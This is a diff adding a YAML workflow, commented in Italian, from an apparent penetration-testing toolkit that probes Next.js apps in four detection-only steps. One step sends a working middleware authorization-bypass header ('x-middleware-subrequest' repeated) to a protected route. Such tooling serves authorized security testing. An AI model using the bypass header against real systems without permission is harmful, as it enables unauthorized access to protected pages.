@@ -1,0 +1,65 @@
+# Workflow offensivo — attack-nextjs (dialetto workflow)
+# Superficie Next.js / App Router in quattro passate, tutte read-tier e detection-only.
+# Il payload di riferimento è tools/payloads/nextjs-rsc.md: qui non viene inviato nessun
+# flusso RSC serializzato (CVE-2025-55182 è RCE non autenticata — la si prova dall'SBOM,
+# non sparando un gadget contro produzione).
+#
+# Ordine:
+#   1. fingerprint — versione del framework dagli header/build manifest: una versione è già
+#      la prova per il middleware bypass (≤ 15.2.2) e per l'image optimizer (55173/57752).
+#   2. middleware — la route protetta con e senza `x-middleware-subrequest`: se la risposta
+#      cambia, l'autorizzazione vive solo nel middleware. 200 dove l'anonimo prende 307/401
+#      è un candidato `triggered`; la conferma è una seconda identità che legge dati veri.
+#   3. optimizer — `/_next/image` su un asset locale: content injection o cache-key
+#      confusion. Solo asset same-origin nostri: mai un host remoto che non controlliamo.
+#   4. bundle — endpoint, chiavi pubbliche e hash `Next-Action` dal bundle: le Server Action
+#      sono endpoint HTTP senza etichetta, e il test giusto è l'autorizzazione, non il gadget.
+#
+# `protected_path` : una route che dietro middleware richiede sessione. Default `/admin`;
+#                    sbagliarla non rompe nulla (il 404 è solo "non c'è niente da testare").
+# Rischio: active (GET + header), nessuna conferma richiesta. Nessuno step scrive sul target.
+# Uso: node tools/workflow.js run workflows/attack-nextjs.yaml -t https://<host> --var protected_path=/dashboard
+name: attack-nextjs
+description: Next.js/RSC detection-only — fingerprint versione, middleware bypass, image optimizer, bundle/Server Action
+vars:
+  tag: target
+  outdir: reports
+  protected_path: /admin
+requires:
+  - httpx-toolkit
+steps:
+  - id: next-fingerprint
+    cmd: node tools/run.js httpx-toolkit -u {target} -title -tech-detect -status-code -json
+    on_error: continue
+    artifacts:
+      - path: "{outdir}/attack-{tag}-next-fingerprint.json"
+        surface: fingerprint
+        from: stdout
+  - id: middleware-bypass
+    cmd: 'node tools/repeater.js --url {target}{protected_path} --header "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" --diff --show-body'
+    on_error: continue
+    artifacts:
+      - path: "{outdir}/attack-{tag}-next-middleware.txt"
+        surface: scan
+        from: stdout
+  - id: middleware-bypass-control
+    cmd: node tools/repeater.js --url {target}{protected_path} --diff --show-body
+    on_error: continue
+    artifacts:
+      - path: "{outdir}/attack-{tag}-next-middleware-control.txt"
+        surface: scan
+        from: stdout
+  - id: image-optimizer
+    cmd: 'node tools/repeater.js --url "{target}/_next/image?url=%2Ffavicon.ico&w=64&q=75" --show-body'
+    on_error: continue
+    artifacts:
+      - path: "{outdir}/attack-{tag}-next-optimizer.txt"
+        surface: scan
+        from: stdout
+  - id: bundle
+    cmd: node tools/analyze-bundle.js {target}
+    on_error: continue
+    artifacts:
+      - path: "{outdir}/attack-{tag}-next-bundle.txt"
+        surface: fingerprint
+        from: stdout
